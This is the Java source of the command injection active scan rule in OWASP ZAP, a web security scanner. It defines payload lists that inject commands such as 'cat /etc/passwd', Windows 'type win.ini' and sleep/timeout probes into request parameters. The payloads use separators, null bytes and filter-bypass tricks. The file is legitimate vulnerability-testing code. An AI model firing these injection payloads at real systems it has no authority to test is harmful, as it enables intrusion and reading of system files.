/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2013 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules;

import static org.zaproxy.zap.extension.ascanrules.utils.Constants.NULL_BYTE_CHARACTER;

import java.io.IOException;
import java.net.SocketException;
import java.util.Collections;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.commons.configuration.ConversionException;
import org.apache.commons.text.StringEscapeUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.commonlib.PolicyTag;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerabilities;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerability;
import org.zaproxy.zap.extension.ruleconfig.RuleConfigParam;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;

/**
 * Active scan rule for Command Injection testing and verification.
 * https://owasp.org/www-community/attacks/Command_Injection
 *
 * @author yhawke (2013)
 */
public class CommandInjectionScanRule extends AbstractAppParamPlugin
        implements CommonActiveScanRuleInfo {

    /** The name of the rule to obtain the time, in seconds, for time-based attacks. */
    private static final String RULE_SLEEP_TIME = RuleConfigParam.RULE_COMMON_SLEEP_TIME;

    /** Prefix for internationalised messages used by this rule */
    private static final String MESSAGE_PREFIX = "ascanrules.commandinjection.";

    // *NIX OS Command constants
    private static final String NIX_TEST_CMD = "cat /etc/passwd";
    private static final Pattern NIX_CTRL_PATTERN = Pattern.compile("root:.:0:0");

    // Windows OS Command constants
    private static final String WIN_TEST_CMD = "type %SYSTEMROOT%\\win.ini";
    private static final Pattern WIN_CTRL_PATTERN = Pattern.compile("\\[fonts\\]");

    // PowerShell Command constants
    private static final String PS_TEST_CMD = "get-help";
    private static final Pattern PS_CTRL_PATTERN =
            Pattern.compile("(?:\\sGet-Help)(?i)|cmdlet|get-alias");

    // Useful if space char isn't allowed by filters
    // http://www.blackhatlibrary.net/Command_Injection
    private static final String BASH_SPACE_REPLACEMENT = "${IFS}";

    // OS Command payloads for command Injection testing
    private static final Map<String, Pattern> NIX_OS_PAYLOADS = new LinkedHashMap<>();
    private static final Map<String, Pattern> WIN_OS_PAYLOADS = new LinkedHashMap<>();
    private static final Map<String, Pattern> PS_PAYLOADS = new LinkedHashMap<>();

    private static final Map<String, String> ALERT_TAGS;

    static {
        Map<String, String> alertTags =
                new HashMap<>(
                        CommonAlertTag.toMap(
                                CommonAlertTag.OWASP_2021_A03_INJECTION,
                                CommonAlertTag.OWASP_2017_A01_INJECTION,
                                CommonAlertTag.WSTG_V42_INPV_12_COMMAND_INJ,
                                CommonAlertTag.HIPAA,
                                CommonAlertTag.PCI_DSS));
        alertTags.put(PolicyTag.API.getTag(), "");
        alertTags.put(PolicyTag.DEV_CICD.getTag(), "");
        alertTags.put(PolicyTag.DEV_STD.getTag(), "");
        alertTags.put(PolicyTag.DEV_FULL.getTag(), "");
        alertTags.put(PolicyTag.QA_STD.getTag(), "");
        alertTags.put(PolicyTag.QA_FULL.getTag(), "");
        alertTags.put(PolicyTag.SEQUENCE.getTag(), "");
        alertTags.put(PolicyTag.PENTEST.getTag(), "");
        ALERT_TAGS = Collections.unmodifiableMap(alertTags);
    }

    static {
        // No quote payloads
        NIX_OS_PAYLOADS.put(NIX_TEST_CMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&" + NIX_TEST_CMD + "&", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put(";" + NIX_TEST_CMD + ";", NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put(WIN_TEST_CMD, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("&" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put(PS_TEST_CMD, PS_CTRL_PATTERN);
        PS_PAYLOADS.put(";" + PS_TEST_CMD, PS_CTRL_PATTERN);

        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + "&\"", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + NIX_TEST_CMD + ";\"", NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + "&\"", WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\"|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put("\";" + PS_TEST_CMD, PS_CTRL_PATTERN);

        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + NIX_TEST_CMD + "&'", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + NIX_TEST_CMD + ";'", NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("'&" + WIN_TEST_CMD + "&'", WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("'|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put("';" + PS_TEST_CMD, PS_CTRL_PATTERN);

        // Special payloads
        NIX_OS_PAYLOADS.put("\n" + NIX_TEST_CMD + "\n", NIX_CTRL_PATTERN); // force enter
        NIX_OS_PAYLOADS.put("`" + NIX_TEST_CMD + "`", NIX_CTRL_PATTERN); // backtick execution
        NIX_OS_PAYLOADS.put("||" + NIX_TEST_CMD, NIX_CTRL_PATTERN); // or control concatenation
        NIX_OS_PAYLOADS.put("&&" + NIX_TEST_CMD, NIX_CTRL_PATTERN); // and control concatenation
        NIX_OS_PAYLOADS.put("|" + NIX_TEST_CMD + "#", NIX_CTRL_PATTERN); // pipe & comment
        // FoxPro for running os commands
        WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put(";" + PS_TEST_CMD + " #", PS_CTRL_PATTERN); // chain & comment

        NIX_OS_PAYLOADS.put("\n" + NIX_TEST_CMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\r" + NIX_TEST_CMD, NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\n" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\r" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\r\n" + NIX_TEST_CMD, NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\r\n" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\t" + NIX_TEST_CMD, NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\t" + WIN_TEST_CMD, WIN_CTRL_PATTERN);

        String insertedCMD = insertUninitVar(NIX_TEST_CMD);
        // No quote payloads
        NIX_OS_PAYLOADS.put("&" + insertedCMD + "&", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put(";" + insertedCMD + ";", NIX_CTRL_PATTERN);
        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + "&\"", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + insertedCMD + ";\"", NIX_CTRL_PATTERN);
        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + insertedCMD + "&'", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + insertedCMD + ";'", NIX_CTRL_PATTERN);
        // Special payloads
        NIX_OS_PAYLOADS.put("\n" + insertedCMD + "\n", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("`" + insertedCMD + "`", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("||" + insertedCMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&&" + insertedCMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("|" + insertedCMD + "#", NIX_CTRL_PATTERN);

        // Used for *nix
        // OS_PAYLOADS.put("\"|\"ld", null);
        // OS_PAYLOADS.put("'|'ld", null);

        /**
         * Null Byte Payloads. Say NIX OS is there and original input is "image". Now Vulnerable
         * application is executing command as "cat" + <input value>+ ".jpeg". If ZAP payload is
         * ";cat /etc/passwd" then the final value passed to Vulnerable application is "image;cat
         * /etc/passwd" and Command executed by application is "cat image;cat /etc/passwd.jpeg" and
         * it will not succeed but if we add null byte to the payload then command executed by
         * application will be "cat image;cat /etc/passwd\0.jpeg" and hence .jpeg will be ignored
         * and attack will succeed. Here we are not adding null byte before the payload i.e.
         * "image\0;cat /etc/passwd" reason is then the underline C/C++ utility stops execution as
         * it finds null byte. More information:
         * http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection
         */
        // No quote payloads
        NIX_OS_PAYLOADS.put(";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);

        WIN_OS_PAYLOADS.put("&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);

        WIN_OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\"|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);

        WIN_OS_PAYLOADS.put("'&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("'|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // Special payloads with null byte
        NIX_OS_PAYLOADS.put(
                "||" + NIX_TEST_CMD + NULL_BYTE_CHARACTER,
                NIX_CTRL_PATTERN); // or control concatenation
        NIX_OS_PAYLOADS.put(
                "&&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER,
                NIX_CTRL_PATTERN); // and control concatenation
        // FoxPro for running os commands
        WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // No quote payloads
        NIX_OS_PAYLOADS.put("&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put(";" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        // Special payloads
        NIX_OS_PAYLOADS.put("||" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
    }

    /** The default number of seconds used in time-based attacks (i.e. sleep commands). */
    private static final int DEFAULT_TIME_SLEEP_SEC = 3;

    // *NIX Blind OS Command constants
    private static final String NIX_BLIND_TEST_CMD = "sleep {0}";
    // Windows Blind OS Command constants
    private static final String WIN_BLIND_TEST_CMD = "timeout /T {0}";
    // PowerSHell Blind Command constants
    private static final String PS_BLIND_TEST_CMD = "start-sleep -s {0}";

    // OS Command payloads for blind command Injection testing
    private static final List<String> NIX_BLIND_OS_PAYLOADS = new LinkedList<>();
    private static final List<String> WIN_BLIND_OS_PAYLOADS = new LinkedList<>();
    private static final List<String> PS_BLIND_PAYLOADS = new LinkedList<>();

    static {
        // No quote payloads
        NIX_BLIND_OS_PAYLOADS.add("&" + NIX_BLIND_TEST_CMD + "&");
        NIX_BLIND_OS_PAYLOADS.add(";" + NIX_BLIND_TEST_CMD + ";");
        WIN_BLIND_OS_PAYLOADS.add("&" + WIN_BLIND_TEST_CMD);
        WIN_BLIND_OS_PAYLOADS.add("|" + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add(";" + PS_BLIND_TEST_CMD);

        // Double quote payloads
        NIX_BLIND_OS_PAYLOADS.add("\"&" + NIX_BLIND_TEST_CMD + "&\"");
        NIX_BLIND_OS_PAYLOADS.add("\";" + NIX_BLIND_TEST_CMD + ";\"");
        WIN_BLIND_OS_PAYLOADS.add("\"&" + WIN_BLIND_TEST_CMD + "&\"");
        WIN_BLIND_OS_PAYLOADS.add("\"|" + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add("\";" + PS_BLIND_TEST_CMD);

        // Single quote payloads
        NIX_BLIND_OS_PAYLOADS.add("'&" + NIX_BLIND_TEST_CMD + "&'");
        NIX_BLIND_OS_PAYLOADS.add("';" + NIX_BLIND_TEST_CMD + ";'");
        WIN_BLIND_OS_PAYLOADS.add("'&" + WIN_BLIND_TEST_CMD + "&'");
        WIN_BLIND_OS_PAYLOADS.add("'|" + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add("';" + PS_BLIND_TEST_CMD);

        // Special payloads
        NIX_BLIND_OS_PAYLOADS.add("\n" + NIX_BLIND_TEST_CMD + "\n"); // force enter
        NIX_BLIND_OS_PAYLOADS.add("`" + NIX_BLIND_TEST_CMD + "`"); // backtick execution
        NIX_BLIND_OS_PAYLOADS.add("||" + NIX_BLIND_TEST_CMD); // or control concatenation
        NIX_BLIND_OS_PAYLOADS.add("&&" + NIX_BLIND_TEST_CMD); // and control concatenation
        NIX_BLIND_OS_PAYLOADS.add("|" + NIX_BLIND_TEST_CMD + "#"); // pipe & comment
        // FoxPro for running os commands
        WIN_BLIND_OS_PAYLOADS.add("run " + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add(";" + PS_BLIND_TEST_CMD + " #"); // chain & comment

        // uninitialized variable waf bypass
        NIX_BLIND_OS_PAYLOADS.add("\n" + NIX_BLIND_TEST_CMD);
        NIX_BLIND_OS_PAYLOADS.add("\r" + NIX_BLIND_TEST_CMD);
        WIN_BLIND_OS_PAYLOADS.add("\n" + WIN_BLIND_TEST_CMD);
        WIN_BLIND_OS_PAYLOADS.add("\r" + WIN_BLIND_TEST_CMD);
        NIX_BLIND_OS_PAYLOADS.add("\r\n" + NIX_BLIND_TEST_CMD);
        WIN_BLIND_OS_PAYLOADS.add("\r\n" + WIN_BLIND_TEST_CMD);
        NIX_BLIND_OS_PAYLOADS.add("\t" + NIX_BLIND_TEST_CMD);
        WIN_BLIND_OS_PAYLOADS.add("\t" + WIN_BLIND_TEST_CMD);

        String insertedCMD = insertUninitVar(NIX_BLIND_TEST_CMD);
        // No quote payloads
        NIX_BLIND_OS_PAYLOADS.add("&" + insertedCMD + "&");
        NIX_BLIND_OS_PAYLOADS.add(";" + insertedCMD + ";");
        // Double quote payloads
        NIX_BLIND_OS_PAYLOADS.add("\"&" + insertedCMD + "&\"");
        NIX_BLIND_OS_PAYLOADS.add("\";" + insertedCMD + ";\"");
        // Single quote payloads
        NIX_BLIND_OS_PAYLOADS.add("'&" + insertedCMD + "&'");
        NIX_BLIND_OS_PAYLOADS.add("';" + insertedCMD + ";'");
        // Special payloads
        NIX_BLIND_OS_PAYLOADS.add("\n" + insertedCMD + "\n");
        NIX_BLIND_OS_PAYLOADS.add("`" + insertedCMD + "`");
        NIX_BLIND_OS_PAYLOADS.add("||" + insertedCMD);
        NIX_BLIND_OS_PAYLOADS.add("&&" + insertedCMD);
        NIX_BLIND_OS_PAYLOADS.add("|" + insertedCMD + "#");
    }

    // Logger instance
    private static final Logger LOGGER = LogManager.getLogger(CommandInjectionScanRule.class);

    // Get WASC Vulnerability description
    private static final Vulnerability VULN = Vulnerabilities.getDefault().get("wasc_31");

    /** The number of seconds used in time-based attacks (i.e. sleep commands). */
    private int timeSleepSeconds = DEFAULT_TIME_SLEEP_SEC;

    private enum TestType {
        FEEDBACK("feedback-based"),
        TIME("time-based");

        private final String nameKey;

        private TestType(String nameKey) {
            this.nameKey = nameKey;
        }

        String getNameKey() {
            return nameKey;
        }
    }

    @Override
    public int getId() {
        return 90020;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public boolean targets(TechSet technologies) {
        if (technologies.includes(Tech.Linux)
                || technologies.includes(Tech.MacOS)
                || technologies.includes(Tech.Windows)) {
            return true;
        }
        return false;
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return VULN.getSolution();
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public int getCweId() {
        return 78;
    }

    @Override
    public int getWascId() {
        return 31;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    private static String getOtherInfo(TestType testType, String testValue) {
        return Constant.messages.getString(
                MESSAGE_PREFIX + "otherinfo." + testType.getNameKey(), testValue);
    }

    @Override
    public void init() {
        try {
            timeSleepSeconds = this.getConfig().getInt(RULE_SLEEP_TIME, DEFAULT_TIME_SLEEP_SEC);
        } catch (ConversionException e) {
            LOGGER.debug(
                    "Invalid value for '{}': {}",
                    RULE_SLEEP_TIME,
                    this.getConfig().getString(RULE_SLEEP_TIME));
        }
        LOGGER.debug("Sleep set to {} seconds", timeSleepSeconds);
    }

    private int getAdaptiveTimeout() {
        try {
            HttpMessage baselineMsg = getNewMsg();
            long startTime = System.currentTimeMillis();
            sendAndReceive(baselineMsg, false);
            long baselineTime = System.currentTimeMillis() - startTime;

            int adaptiveTimeout = Math.min(15, Math.max(3, (int) (baselineTime / 1000) + 2));

            LOGGER.debug(
                    "Baseline response time: {}ms, adaptive timeout: {}s",
                    baselineTime,
                    adaptiveTimeout);

            return adaptiveTimeout;
        } catch (Exception e) {
            LOGGER.debug("Failed to measure baseline, using default timeout: {}", timeSleepSeconds);
            return timeSleepSeconds;
        }
    }

    /**
     * Gets the number of seconds used in time-based attacks.
     *
     * <p><strong>Note:</strong> Method provided only to ease the unit tests.
     *
     * @return the number of seconds used in time-based attacks.
     */
    int getTimeSleep() {
        return timeSleepSeconds;
    }

    /**
     * Scan for OS Command Injection Vulnerabilities
     *
     * @param msg a request only copy of the original message (the response isn't copied)
     * @param paramName the parameter name that need to be exploited
     * @param value the original parameter value
     */
    @Override
    public void scan(HttpMessage msg, String paramName, String value) {
        LOGGER.debug(
                "Command Injection scan for [{}][{}], parameter [{}]",
                msg.getRequestHeader().getMethod(),
                msg.getRequestHeader().getURI(),
                paramName);

        performParameterInjection(msg, paramName, value);
    }

    private void performParameterInjection(HttpMessage msg, String paramName, String value) {
        if (inScope(Tech.Linux) || inScope(Tech.MacOS)) {
            if (testCommandInjection(
                    msg, paramName, value, NIX_OS_PAYLOADS, NIX_BLIND_OS_PAYLOADS)) {
                return;
            }
        }

        if (isStop()) return;

        if (inScope(Tech.Windows)) {
            if (testCommandInjection(
                    msg, paramName, value, WIN_OS_PAYLOADS, WIN_BLIND_OS_PAYLOADS)) {
                return;
            }

            if (isStop()) return;

            if (testCommandInjection(msg, paramName, value, PS_PAYLOADS, PS_BLIND_PAYLOADS)) {
                return;
            }
        }
    }

    private static String insertUninitVar(String command) {
        return command.replace(" ", "${u} ");
    }

    private boolean testBlindCommandInjection(
            String paramName,
            String value,
            int blindTargetCount,
            List<String> blindPayloads,
            String osType) {

        int adaptiveTimeout = getAdaptiveTimeout();
        String sleepCmd = String.valueOf(adaptiveTimeout);

        Iterator<String> it = blindPayloads.iterator();
        for (int i = 0; it.hasNext() && i < blindTargetCount; i++) {
            String payload = it.next().replace("{0}", sleepCmd);

            if (isStop()) return false;

            HttpMessage msg = getNewMsg();
            setParameter(msg, paramName, value + payload);

            try {
                long startTime = System.currentTimeMillis();
                sendAndReceive(msg, false);
                long endTime = System.currentTimeMillis();
                long responseTime = endTime - startTime;

                if (responseTime >= (adaptiveTimeout * 1000 - 500)) {
                    String otherInfo =
                            getOtherInfo(TestType.TIME, payload)
                                    + " (OS: "
                                    + osType
                                    + ", Sleep time: "
                                    + adaptiveTimeout
                                    + "s)";

                    buildAlert(
                                    paramName,
                                    payload,
                                    "Response time: " + responseTime + "ms",
                                    otherInfo,
                                    msg)
                            .raise();
                    return true;
                }

            } catch (SocketException ex) {
                LOGGER.debug(
                        "Network error during blind command injection test: {}", ex.getMessage());
                continue;
            } catch (IOException ex) {
                LOGGER.warn(
                        "Blind command injection test failed for parameter [{}]: {}",
                        paramName,
                        ex.getMessage());
            }
        }

        return false;
    }

    /**
     * Tests for injection vulnerabilities with the given payloads.
     *
     * @param msg the HTTP message to test
     * @param paramName the parameter name to test for injection
     * @param value the original parameter value
     * @param payloads the feedback-based payloads with detection patterns
     * @param blindPayloads the time-based blind payloads
     * @return {@code true} if vulnerability found, {@code false} otherwise
     */
    private boolean testCommandInjection(
            HttpMessage msg,
            String paramName,
            String value,
            Map<String, Pattern> payloads,
            List<String> blindPayloads) {

        Iterator<Map.Entry<String, Pattern>> it = payloads.entrySet().iterator();
        boolean firstPayload = true;
        int maxPayloads = getTargetCount();

        for (int i = 0; it.hasNext() && i < maxPayloads; i++) {
            Map.Entry<String, Pattern> entry = it.next();
            String payload = entry.getKey();
            Pattern pattern = entry.getValue();

            if (isStop()) return false;

            HttpMessage testMsg = getNewMsg();
            String finalPayload = firstPayload ? payload : value + payload;
            firstPayload = false;

            setParameter(testMsg, paramName, finalPayload);

            try {
                sendAndReceive(testMsg, false);
                String responseContent = testMsg.getResponseBody().toString();

                if (testMsg.getResponseHeader().hasContentType("html")) {
                    responseContent = StringEscapeUtils.unescapeHtml4(responseContent);
                }

                Matcher matcher = pattern.matcher(responseContent);
                if (matcher.find()) {
                    String evidence = matcher.group();
                    String otherInfo = getOtherInfo(TestType.FEEDBACK, finalPayload);

                    buildAlert(paramName, finalPayload, evidence, otherInfo, testMsg).raise();
                    return true;
                }

            } catch (SocketException ex) {
                LOGGER.debug("Network error during command injection test: {}", ex.getMessage());
                continue;
            } catch (IOException ex) {
                LOGGER.warn(
                        "Command injection test failed for parameter [{}]: {}",
                        paramName,
                        ex.getMessage());
            }
        }

        return testBlindCommandInjection(
                paramName, value, getBlindTargetCount(), blindPayloads, "");
    }

    private int getTargetCount() {
        switch (this.getAttackStrength()) {
            case LOW:
                return 1;
            case MEDIUM:
                return 2;
            case HIGH:
                return 3;
            case INSANE:
                return NIX_OS_PAYLOADS.size(); // Test all payloads to ensure null byte detection
            default:
                return 1;
        }
    }

    private int getBlindTargetCount() {
        switch (this.getAttackStrength()) {
            case LOW:
                return 1;
            case MEDIUM:
                return 2;
            case HIGH:
                return 3;
            case INSANE:
                return 6;
            default:
                return 1;
        }
    }

    private AlertBuilder buildAlert(
            String param, String attack, String evidence, String otherInfo, HttpMessage msg) {
        return newAlert()
                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                .setParam(param)
                .setAttack(attack)
                .setEvidence(evidence)
                .setMessage(msg)
                .setOtherInfo(otherInfo);
    }

    @Override
    public List<Alert> getExampleAlerts() {
        return List.of(
                buildAlert(
                                "qry",
                                "a;cat /etc/passwd ",
                                "root:x:0:0",
                                getOtherInfo(TestType.FEEDBACK, "a;cat /etc/passwd "),
                                null)
                        .build());
    }
}
